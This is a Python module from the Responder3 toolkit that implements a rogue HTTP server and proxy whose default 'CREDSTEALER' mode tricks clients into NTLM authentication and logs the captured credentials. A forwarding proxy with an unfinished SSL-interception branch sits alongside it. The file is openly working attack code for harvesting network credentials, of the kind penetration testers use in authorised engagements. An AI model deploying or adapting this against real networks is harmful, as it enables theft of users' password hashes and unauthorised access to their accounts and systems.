import enum
import logging
import asyncio
from urllib.parse import urlparse
import base64

from responder3.core.logging.logger import *
from responder3.core.asyncio_helpers import R3ConnectionClosed
from responder3.core.commons import *
from responder3.protocols.HTTP import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession
from responder3.protocols.authentication.loader import *

class HTTPProxy:
	def __init__(self):
		pass
		
class HTTPSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
		self.server_mode = HTTPServerMode.CREDSTEALER
		self.current_state = HTTPState.UNAUTHENTICATED
		self.log_data = False
		self.parser = HTTPRequest

		self.http_version = HTTPVersion.HTTP11
		self.http_content_encoding = HTTPContentEncoding.IDENTITY
		self.http_connect_charset = 'utf8'
		self.auth_mecha = None
		self.auth_mecha_name = None
		self.http_cookie = None
		self.http_server_banner = None

		self.proxy_invisible = False
		self.proxy_ssl_intercept = False
		self.proxy_closed = asyncio.Event()

		self.close_session = asyncio.Event()



	def __repr__(self):
		t  = '== HTTPSession ==\r\n'
		t += 'http_version:      %s\r\n' % repr(self.http_version)
		t += 'http_content_encoding: %s\r\n' % repr(self.http_content_encoding)
		t += 'http_connect_charset: %s\r\n' % repr(self.http_connect_charset)
		t += 'auth_mecha: %s\r\n' % repr(self.auth_mecha)
		t += 'http_cookie:       %s\r\n' % repr(self.http_cookie)
		t += 'http_server_banner: %s\r\n' % repr(self.http_server_banner)
		t += 'mode:     %s\r\n' % repr(self.server_mode)
		t += 'current_state:     %s\r\n' % repr(self.current_state)
		return t


class HTTP(ResponderServer):
	def init(self):
		self.parse_settings()

	def parse_settings(self):
		if self.settings is None:
			# default settings, basically just NTLM auth
			self.session.server_mode = HTTPServerMode.CREDSTEALER
			self.session.auth_mecha_name, self.session.auth_mecha  = AuthMechaLoader.from_dict({'auth_mecha':'NTLM'})

		else:
			if 'mode' in self.settings:
				self.session.server_mode = HTTPServerMode(self.settings['mode'].upper())

			if 'authentication' in self.settings:
				self.session.auth_mecha_name, self.session.auth_mecha = AuthMechaLoader.from_dict(self.settings['authentication'])

	async def parse_message(self, timeout = None):
		try:
			req = await asyncio.wait_for(self.session.parser.from_streamreader(self.creader), timeout = timeout)
			return req
		except asyncio.TimeoutError:
			await self.log('Timeout!', logging.DEBUG)

	async def send_data(self, data):
		self.cwriter.write(data)
		await self.cwriter.drain()

	async def modify_data(self, data):
		return data

	async def proxy_forwarder(self, reader, writer, laddr, raddr):
		while not self.session.close_session.is_set():
			try:
				data = await asyncio.wait_for(reader.read(1024), timeout=None)
			except asyncio.TimeoutError:
				await self.log('Timeout!', logging.DEBUG)
				self.session.close_session.set()
				break	
			
			if data == b'' or reader.at_eof():
				await self.log('Connection closed!', logging.DEBUG)
				self.session.close_session.set()
				break

			# await self.logProxy('original data: %s' % repr(data), laddr, raddr)
			modified_data = await self.modify_data(data)
			if modified_data != data:
				pass
				# await self.logProxy('modified data: %s' % repr(modified_data),laddr, raddr)
			
			try:
				writer.write(modified_data)
				await asyncio.wait_for(writer.drain(), timeout=1)
			except asyncio.TimeoutError:
				await self.log('Timeout!', logging.DEBUG)
				self.session.close_session.set()
				break
			except OSError as e:
				await self.log('Socket probably got closed!', logging.DEBUG)
				self.session.close_session.set()
				break

		return

	async def httpproxy(self, req):
		# self.session.invisible!!!!

		if req.method == 'CONNECT':
			rhost, rport = req.uri.split(':')
			# https://tools.ietf.org/html/rfc7231#section-4.3.6
			if not self.session.proxy_ssl_intercept:
				# not intercepting SSL traffic, acting as a generic proxy
				try:
					remote_reader, remote_writer = await asyncio.wait_for(asyncio.open_connection(host=rhost, port=int(rport)), timeout=1)
				except Exception as e:
					await self.logger.exception('Failed to create remote connection to %s:%s!' % (rhost, rport))
					return

				# indicating to the client that TCP socket has opened towards the remote host
				await asyncio.wait_for(self.send_data(HTTP200Resp().to_bytes()), timeout = 1)
				self.loop.create_task(self.proxy_forwarder(remote_reader, self.cwriter, '%s:%d' % (rhost,int(rport)), self.session.connection.get_local_address()))
				self.loop.create_task(self.proxy_forwarder(self.creader, remote_writer, self.session.connection.get_local_address(), '%s:%d' % (rhost,int(rport))))
				await asyncio.wait_for(self.session.proxy_closed.wait(), timeout = None)
			
			else:
				print('a')
				while not self.session.close_session.is_set():
					print('aa')
					data = await self.creader.read(-1)
					print('=====request======')
					print(data)

					
					# sending data to remote host
					remote_writer.write(data)
					await remote_writer.drain()

					data_return = await remote_reader.read()
					print('=======response===============')
					print(data_return)

					await asyncio.wait_for(self.send_data(data_return), timeout = 1)

					# req = await asyncio.wait_for(self.parse_message(), timeout = 10)
		
		else:
			while not self.session.close_session.is_set():
				o = urlparse(req.uri)
				if o.netloc.find(':') != -1:
					rhost, rport = o.netloc.split(':')
				else:
					rhost = o.netloc
					rport = 80

				if o.query != '':
					uri = '?'.join([o.path, o.query])
				else:
					uri = o.path

				# removing proxy authorization header
				req.remove_header('proxy-authorization')

				req_new = HTTPRequest.construct(req.method, uri, req.headers, req.body, req.version)
				await self.log('======== request sent ============', logging.DEBUG)
				# print(req_new)

				try:
					remote_reader, remote_writer = await asyncio.wait_for(asyncio.open_connection(host=rhost, port=int(rport)), timeout=1)
				except Exception as e:
					await self.logger.exception()
					return
					

				# sending data to remote host
				remote_writer.write(req_new.to_bytes())
				await remote_writer.drain()

				resp = await asyncio.wait_for(HTTPResponse.from_streamreader(remote_reader), timeout = 1)
				await self.log('=== proxyying response ====', logging.DEBUG)
				await asyncio.wait_for(self.send_data(resp.to_bytes()), timeout = None)

				await self.log('=== PROXY === \r\n %s \r\n %s ======' % (req_new, resp))

				if req.props.connection is not None and req.props.connection == HTTPConnection.KEEP_ALIVE:
					req = await asyncio.wait_for(self.parse_message(timeout = None), timeout = None)
					if req is None:
						self.session.close_session.set()
						return
				else:
					await self.log('Closing connection!', logging.DEBUG)
					self.session.close_session.set()
					remote_writer.close()
					self.cwriter.close()
					return

	@r3trafficlogexception				
	async def run(self):
		while not self.shutdown_evt.is_set() or not self.session.close_session.is_set():
			try:
				result = await asyncio.gather(*[asyncio.wait_for(self.session.parser.from_streamreader(self.creader), timeout=None)], return_exceptions=True)
			except asyncio.CancelledError as e:
				raise e
			if isinstance(result[0], R3ConnectionClosed):
				return
			elif isinstance(result[0], Exception):
				raise result[0]
			else:
				req = result[0]
				
			if self.session.current_state == HTTPState.UNAUTHENTICATED and self.session.auth_mecha is None:
				self.session.current_state = HTTPState.AUTHENTICATED
			
			if self.session.current_state == HTTPState.UNAUTHENTICATED:
				auth_header_key = 'Authorization' if self.session.server_mode != HTTPServerMode.PROXY else 'Proxy-Authorization'
				authline = req.headers.get(auth_header_key)
				authdata = None
				if authline:
					m = authline.find(' ')
					authdata = authline[m+1:]
					if authline and self.session.auth_mecha_name == AuthMecha.NTLM:
						authdata = base64.b64decode(authdata)

				if self.session.auth_mecha_name == AuthMecha.NTLM and authdata is None:
					if self.session.server_mode == HTTPServerMode.PROXY:
						await self.send_data(HTTP407Resp('NTLM').to_bytes())
					else:
						await self.send_data(HTTP401Resp('NTLM').to_bytes())
					continue
				else:
					status, data = self.session.auth_mecha.do_auth(authdata)

				if status == AuthResult.OK or status == AuthResult.FAIL:
					await self.logger.credential(data.to_credential())
				
				if status == AuthResult.OK:
					self.session.current_state = HTTPState.AUTHENTICATED
					if self.session.server_mode == HTTPServerMode.PROXY:
						await self.httpproxy(req)
					else:
						await self.send_data(HTTP200Resp().to_bytes())
						return
				
				elif status == AuthResult.FAIL:
					self.session.current_state = HTTPState.AUTHFAILED
					await self.send_data(HTTP403Resp('Auth failed!').to_bytes())
					return
				
				elif status == AuthResult.CONTINUE:
					rdata = self.session.auth_mecha_name.name
					if data is not None:
						if self.session.auth_mecha_name == AuthMecha.NTLM:
							rdata += ' %s' % base64.b64encode(data).decode()
						else:
							rdata += ' %s' % data
					
					if self.session.server_mode == HTTPServerMode.PROXY:
						await self.send_data(HTTP407Resp(rdata).to_bytes())
					else:
						await self.send_data(HTTP401Resp(rdata).to_bytes())
					continue